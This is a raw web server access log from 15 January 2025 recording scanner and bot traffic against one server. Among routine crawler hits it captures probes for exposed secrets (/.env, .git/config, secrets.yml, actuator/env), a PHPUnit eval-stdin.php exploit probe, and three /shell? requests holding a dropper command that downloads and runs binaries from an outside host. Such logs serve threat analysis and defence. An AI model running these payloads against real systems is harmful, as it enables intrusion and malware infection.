78.153.140.93 - - [15/Jan/2025:03:59:27 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
104.234.115.201 - - [15/Jan/2025:04:09:42 +0000] "" 400 524 "-" "-"
104.234.115.201 - - [15/Jan/2025:04:10:02 +0000] "\x16\x03\x01" 400 524 "-" "-"
104.234.115.201 - - [15/Jan/2025:04:10:40 +0000] "\x16\x03\x01" 400 524 "-" "-"
104.234.115.201 - - [15/Jan/2025:04:11:14 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.201 - - [15/Jan/2025:04:11:55 +0000] "\x16\x03\x01" 400 524 "-" "-"
104.234.115.201 - - [15/Jan/2025:04:13:17 +0000] "GET /manage/account/login HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.201 - - [15/Jan/2025:04:15:06 +0000] "\x16\x03\x01" 400 524 "-" "-"
45.148.10.71 - - [15/Jan/2025:04:16:56 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
45.148.10.71 - - [15/Jan/2025:04:16:56 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
45.43.33.210 - - [15/Jan/2025:04:17:40 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
104.234.115.201 - - [15/Jan/2025:04:18:03 +0000] "\x16\x03\x01" 400 524 "-" "-"
104.234.115.201 - - [15/Jan/2025:04:19:19 +0000] "GET /index.html HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.201 - - [15/Jan/2025:04:21:03 +0000] "\x16\x03\x01" 400 524 "-" "-"
104.234.115.201 - - [15/Jan/2025:04:22:21 +0000] "GET /+CSCOE+/logon.html HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
148.153.56.82 - - [15/Jan/2025:04:22:51 +0000] "GET /kHDe HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [15/Jan/2025:04:22:52 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196:80/kHDe" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [15/Jan/2025:04:22:53 +0000] "GET /mLcA HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [15/Jan/2025:04:22:55 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196:80/mLcA" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [15/Jan/2025:04:22:56 +0000] "GET /aab8 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [15/Jan/2025:04:22:56 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196:80/aab8" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [15/Jan/2025:04:22:57 +0000] "GET /aab9 HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
148.153.56.82 - - [15/Jan/2025:04:22:57 +0000] "GET / HTTP/1.1" 200 966 "http://34.93.54.196:80/aab9" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:32.0) Gecko/20100101 Firefox/32.0"
104.234.115.201 - - [15/Jan/2025:04:25:28 +0000] "GET /cgi-bin/login.cgi HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.201 - - [15/Jan/2025:04:27:02 +0000] "\x16\x03\x01" 400 524 "-" "-"
104.234.115.201 - - [15/Jan/2025:04:28:18 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.201 - - [15/Jan/2025:04:29:54 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.93 - - [15/Jan/2025:04:33:14 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:04:33:14 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
104.234.115.201 - - [15/Jan/2025:04:33:54 +0000] "GET /doc/index.html HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.201 - - [15/Jan/2025:04:35:28 +0000] "\x16\x03\x01" 400 524 "-" "-"
104.234.115.201 - - [15/Jan/2025:04:36:38 +0000] "GET /remote/login HTTP/1.1" 302 331 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
104.234.115.201 - - [15/Jan/2025:04:38:13 +0000] "\x16\x03\x01" 400 524 "-" "-"
104.234.115.201 - - [15/Jan/2025:04:39:22 +0000] "GET / HTTP/1.1" 200 947 "-" "'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; https://www.nokia.com/genomecrawler)'"
141.98.11.119 - - [15/Jan/2025:04:51:43 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
78.153.140.148 - - [15/Jan/2025:05:02:18 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [15/Jan/2025:05:02:18 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
217.142.184.125 - - [15/Jan/2025:05:03:09 +0000] "GET / HTTP/1.1" 200 966 "-" "Python/3.10 aiohttp/3.11.11"
31.220.1.144 - - [15/Jan/2025:05:05:17 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
95.214.55.226 - - [15/Jan/2025:05:20:40 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
141.98.11.119 - - [15/Jan/2025:05:32:27 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
78.153.140.93 - - [15/Jan/2025:05:36:57 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:05:36:57 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
195.144.21.56 - - [15/Jan/2025:05:53:34 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
195.144.21.56 - - [15/Jan/2025:05:53:35 +0000] "GET /robots.txt HTTP/1.1" 302 331 "-" "-"
195.144.21.56 - - [15/Jan/2025:05:53:35 +0000] "GET /sitemap.xml HTTP/1.1" 302 331 "-" "-"
195.144.21.56 - - [15/Jan/2025:05:53:36 +0000] "GET /.well-known/security.txt HTTP/1.1" 302 331 "-" "-"
195.144.21.56 - - [15/Jan/2025:05:53:39 +0000] "GET /favicon.ico HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
64.62.197.202 - - [15/Jan/2025:05:53:44 +0000] "\x16\x03\x01" 400 524 "-" "-"
51.8.223.96 - - [15/Jan/2025:06:13:23 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
178.215.236.132 - - [15/Jan/2025:06:17:49 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36"
103.203.57.7 - - [15/Jan/2025:06:21:25 +0000] "GET / HTTP/1.1" 200 1761 "-" "HTTP Banner Detection (https://security.ipip.net)"
159.223.205.208 - - [15/Jan/2025:06:23:53 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
141.98.11.119 - - [15/Jan/2025:06:24:45 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
80.82.77.202 - - [15/Jan/2025:06:40:07 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11"
31.13.224.222 - - [15/Jan/2025:06:41:26 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:06:42:55 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:06:42:56 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [15/Jan/2025:06:43:36 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [15/Jan/2025:06:43:36 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
198.235.24.22 - - [15/Jan/2025:07:05:31 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
94.102.56.99 - - [15/Jan/2025:07:11:16 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
94.102.56.99 - - [15/Jan/2025:07:11:16 +0000] "GET / HTTP/1.1" 200 947 "http://34.93.54.196/favicon.ico" "Mozilla/5.0 zgrab/0.x"
94.102.56.99 - - [15/Jan/2025:07:11:16 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
121.144.67.140 - - [15/Jan/2025:07:13:22 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.93 - - [15/Jan/2025:07:22:08 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:07:22:08 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
34.22.192.129 - - [15/Jan/2025:07:27:41 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
64.62.156.70 - - [15/Jan/2025:07:40:33 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.156 Not(A:Brand/24 YaBrowser/24.4.1.899 Yowser/2.5  Safari/537.36"
64.62.156.72 - - [15/Jan/2025:07:42:38 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
64.62.156.77 - - [15/Jan/2025:07:43:11 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.156 Not(A:Brand/24 YaBrowser/24.4.1.899 Yowser/2.5  Safari/537.36"
183.207.45.109 - - [15/Jan/2025:07:52:32 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:08:00:27 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:08:00:27 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [15/Jan/2025:08:21:48 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [15/Jan/2025:08:21:49 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [15/Jan/2025:08:25:08 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
198.235.24.24 - - [15/Jan/2025:08:29:19 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
179.43.191.146 - - [15/Jan/2025:08:43:17 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [15/Jan/2025:09:22:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:09:22:31 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.224 - - [15/Jan/2025:09:22:39 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0"
78.153.140.224 - - [15/Jan/2025:09:22:39 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.224 - - [15/Jan/2025:09:22:39 +0000] "GET /.production HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36 OPR/48.0.2685.32 (Edition Campaign 34)"
78.153.140.224 - - [15/Jan/2025:09:22:39 +0000] "GET /.env.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 (compatible; Windows; U; Windows NT 6.2; WOW64; en-US; rv:12.0) Gecko/20120403211507 Firefox/12.0"
78.153.140.224 - - [15/Jan/2025:09:22:40 +0000] "GET /env.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPad; U; CPU OS 4_3 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5"
78.153.140.224 - - [15/Jan/2025:09:22:40 +0000] "GET /.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALCJS; rv:11.0) like Gecko"
78.153.140.224 - - [15/Jan/2025:09:22:40 +0000] "GET /env. HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 5.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0"
78.153.140.224 - - [15/Jan/2025:09:22:41 +0000] "GET /.env. HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]"
78.153.140.224 - - [15/Jan/2025:09:22:41 +0000] "GET /p-info.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/530.8 (KHTML, like Gecko) Chrome/2.0.178.0 Safari/530.8"
78.153.140.224 - - [15/Jan/2025:09:22:41 +0000] "GET /p.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; es_ES) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7"
78.153.140.224 - - [15/Jan/2025:09:22:42 +0000] "GET /p_info.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041218 Firefox/1.0"
78.153.140.224 - - [15/Jan/2025:09:22:42 +0000] "GET /php.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Ubuntu/10.10 Chromium/8.0.552.237 Chrome/8.0.552.237 Safari/534.10"
78.153.140.224 - - [15/Jan/2025:09:22:43 +0000] "GET /php_info.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:23.0) Gecko/20131011 Firefox/23.0"
78.153.140.224 - - [15/Jan/2025:09:22:43 +0000] "GET /secrets.yml HTTP/1.1" 302 331 "-" "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14"
78.153.140.224 - - [15/Jan/2025:09:22:43 +0000] "GET /php-details.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18"
78.153.140.224 - - [15/Jan/2025:09:22:44 +0000] "GET /php-info.php HTTP/1.1" 302 331 "-" "More Opera 9.20 user agents strings -->>"
179.49.148.25 - - [15/Jan/2025:09:29:07 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
205.210.31.31 - - [15/Jan/2025:09:31:23 +0000] "\x16\x03\x01" 400 524 "-" "-"
205.210.31.31 - - [15/Jan/2025:09:31:23 +0000] "\x16\x03\x01" 400 524 "-" "-"
198.235.24.233 - - [15/Jan/2025:09:34:25 +0000] "\x16\x03\x01" 400 524 "-" "-"
198.235.24.233 - - [15/Jan/2025:09:34:25 +0000] "\x16\x03\x01" 400 524 "-" "-"
31.13.224.186 - - [15/Jan/2025:09:46:25 +0000] "GET /.git/config HTTP/1.1" 302 387 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.79.181.251 - - [15/Jan/2025:09:47:00 +0000] "\x16\x03\x01" 400 524 "-" "-"
78.153.140.93 - - [15/Jan/2025:09:54:17 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:09:54:18 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [15/Jan/2025:09:55:16 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [15/Jan/2025:09:55:16 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
87.120.115.119 - - [15/Jan/2025:09:55:29 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 9; ANE-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36"
80.82.77.202 - - [15/Jan/2025:10:05:04 +0000] "\x16\x03\x02\x01o\x01" 400 524 "-" "-"
171.7.89.247 - - [15/Jan/2025:10:20:09 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [15/Jan/2025:10:23:08 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [15/Jan/2025:10:23:08 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:10:48:24 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:10:48:24 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
139.162.71.210 - - [15/Jan/2025:11:11:33 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
47.89.154.16 - - [15/Jan/2025:11:36:11 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
78.153.140.93 - - [15/Jan/2025:11:44:03 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:11:44:04 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
118.34.248.13 - - [15/Jan/2025:11:47:12 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [15/Jan/2025:11:49:43 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [15/Jan/2025:11:49:44 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
4.151.230.193 - - [15/Jan/2025:11:51:22 +0000] "GET /actuator/health HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
59.187.201.25 - - [15/Jan/2025:12:07:29 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
180.5.194.81 - - [15/Jan/2025:12:32:14 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
45.156.129.133 - - [15/Jan/2025:13:01:01 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:13:11:49 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [15/Jan/2025:13:11:49 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
139.59.101.104 - - [15/Jan/2025:13:32:26 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
62.84.100.218 - - [15/Jan/2025:13:57:04 +0000] "GET /env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
62.84.100.218 - - [15/Jan/2025:13:57:06 +0000] "GET /actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.3.27"
62.84.100.218 - - [15/Jan/2025:13:57:09 +0000] "GET /admin/actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36"
62.84.100.218 - - [15/Jan/2025:13:57:16 +0000] "GET /api/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
62.84.100.218 - - [15/Jan/2025:13:57:20 +0000] "GET /admin/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:71.0) Gecko/20100101 Firefox/71.0"
62.84.100.218 - - [15/Jan/2025:13:57:21 +0000] "GET /api/actuator/env HTTP/1.1" 302 292 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.4.19"
